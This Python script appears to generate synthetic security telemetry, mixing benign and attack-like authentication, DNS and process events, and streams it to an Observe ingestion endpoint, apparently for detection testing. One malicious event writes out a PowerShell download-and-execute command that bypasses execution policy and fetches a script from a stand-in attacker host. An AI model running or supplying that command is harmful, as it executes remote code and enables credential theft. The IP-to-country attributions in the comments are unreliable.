import os
import time
import json
import random
import requests
from datetime import datetime, timezone

# Configuration via environment variables or defaults
OBSERVE_ENDPOINT = os.getenv("OBSERVE_ENDPOINT")
AUTH_TOKEN = os.getenv("AUTH_TOKEN")
BATCH_SIZE = int(os.getenv("BATCH_SIZE", "50"))        # Number of events per batch send
NORMAL_RATIO = float(os.getenv("NORMAL_RATIO", "0.9"))  # 90% normal events, 10% malicious
SLEEP_INTERVAL = int(os.getenv("SLEEP_INTERVAL", "30")) # Sleep for 30 seconds between each batch of events

# Hosts, Users, and Domain Data
HOSTS = ["web-server01", "web-server02", "db-server01", "finance-app-server01"]
USERS = ["jdoe", "asmith", "mbrown", "admin"]
INTERNAL_DOMAINS = ["intranet.local", "fileshare.local", "internal.api.local"]
MALICIOUS_DOMAINS = ["malicious.example.com", "evilhost.badco"]

# Global IPs for normal events (public DNS and well-known IPs as placeholders)
GLOBAL_IPS = [
    "8.8.8.8",         # Google DNS (USA)
    "1.1.1.1",         # Cloudflare DNS (Global)
    "8.8.4.4",         # Google DNS secondary (USA)
    "9.9.9.9",         # Quad9 DNS (Global)
    "208.67.222.222",  # OpenDNS (USA)
    "185.228.168.168"  # CleanBrowsing DNS (Global)
]

# Malicious IPs (sample public IPs placeholders associated with global attack sources)
MALICIOUS_IPS = [
    "203.0.113.42",     # Placeholder often used for demo, say China
    "185.199.108.153",  # Placeholder, say Russia
    "79.175.164.30",    # Placeholder, say Iran
    "175.45.176.1"      # Placeholder, say North Korea
]

def generate_timestamp():
    return datetime.now(timezone.utc).isoformat()

def pick_global_ip():
    return random.choice(GLOBAL_IPS)

def pick_malicious_ip():
    return random.choice(MALICIOUS_IPS)

def generate_normal_event():
    event_type = random.choice(["authentication", "dns_query", "process_create"])
    ts = generate_timestamp()
    source_ip = pick_global_ip()

    if event_type == "authentication":
        user = random.choice(USERS)
        status = "success"
        return {
            "timestamp": ts,
            "event_type": "authentication",
            "username": user,
            "source_ip": source_ip,
            "status": status,
            "message": "Successful login"
        }

    elif event_type == "dns_query":
        host = random.choice(HOSTS)
        domain = random.choice(INTERNAL_DOMAINS)
        return {
            "timestamp": ts,
            "event_type": "dns_query",
            "host": host,
            "query": domain,
            "response_ip": "10.100.{}.{}".format(random.randint(0, 250), random.randint(0, 250)),
            "threat_indicator": "None",
            "source_ip": source_ip
        }

    elif event_type == "process_create":
        host = random.choice(HOSTS)
        user = random.choice(USERS)
        process_name = random.choice(["chrome.exe", "excel.exe", "powershell.exe", "java", "nginx"])
        command_line = "{} --version".format(process_name)
        return {
            "timestamp": ts,
            "event_type": "process_create",
            "host": host,
            "user": user,
            "process_name": process_name,
            "command_line": command_line,
            "alert_indicator": False,
            "source_ip": source_ip
        }

def generate_malicious_event():
    event_type = random.choice(["authentication", "dns_query", "process_create"])
    ts = generate_timestamp()
    source_ip = pick_malicious_ip()

    if event_type == "authentication":
        # Brute force attempt against user jdoe
        user = "jdoe"
        # 80% chance failed, 20% chance success
        if random.random() < 0.8:
            status = "failed"
            msg = "Failed login attempt from suspicious IP"
        else:
            status = "success"
            msg = "Potentially compromised account login from suspicious IP"
        return {
            "timestamp": ts,
            "event_type": "authentication",
            "username": user,
            "source_ip": source_ip,
            "status": status,
            "message": msg
        }

    elif event_type == "dns_query":
        # Malicious DNS query
        host = "finance-app-server01"
        domain = random.choice(MALICIOUS_DOMAINS)
        return {
            "user": random.choice(USERS),
            "timestamp": ts,
            "event_type": "dns_query",
            "host": host,
            "query": domain,
            "response_ip": random.choice(MALICIOUS_IPS),
            "threat_indicator": "KnownMalwareDomain",
            "source_ip": source_ip
        }

    elif event_type == "process_create":
        # Suspicious process execution
        host = "finance-app-server01"
        user = "jdoe"
        process_name = "powershell.exe"
        command_line = ("powershell.exe -NoProfile -ExecutionPolicy Bypass "
                        "-Command \"IEX(New-Object Net.WebClient).downloadString('http://malicious.example.com/mim.ps1')\"")
        return {
            "timestamp": ts,
            "event_type": "process_create",
            "host": host,
            "user": user,
            "process_name": process_name,
            "command_line": command_line,
            "alert_indicator": True,
            "source_ip": source_ip
        }

def send_events_to_observe(events):
    headers = {
        "Content-Type": "application/x-ndjson"
    }
    if AUTH_TOKEN:
        headers["Authorization"] = f"Bearer {AUTH_TOKEN}"

    # Prepare ndjson payload
    payload_lines = [json.dumps(e) for e in events]
    data = "\n".join(payload_lines)

    # Check size constraints (approximate)
    max_size_bytes = 5 * 1024 * 1024  # 5MB max
    if len(data.encode('utf-8')) > max_size_bytes:
        # If data too large, chunk it
        chunked_events = []
        current_chunk = []
        current_size = 0
        for event_str in payload_lines:
            event_size = len(event_str.encode('utf-8')) + 1
            if current_size + event_size > max_size_bytes and current_chunk:
                _send_chunk_to_observe("\n".join(current_chunk), headers)
                current_chunk = [event_str]
                current_size = event_size
            else:
                current_chunk.append(event_str)
                current_size += event_size
        if current_chunk:
            _send_chunk_to_observe("\n".join(current_chunk), headers)
    else:
        _send_chunk_to_observe(data, headers)

def _send_chunk_to_observe(data_str, headers):
    response = requests.post(OBSERVE_ENDPOINT, headers=headers, data=data_str)
    if response.status_code >= 300:
        print(f"Error sending events: {response.status_code} - {response.text}")
    else:
        print(f"Successfully sent {len(data_str.splitlines())} events at {datetime.now(timezone.utc)}")

if __name__ == "__main__":
    while True:
        events = []
        for _ in range(BATCH_SIZE):
            if random.random() < NORMAL_RATIO:
                event = generate_normal_event()
            else:
                event = generate_malicious_event()
            events.append(event)

        send_events_to_observe(events)
        time.sleep(SLEEP_INTERVAL)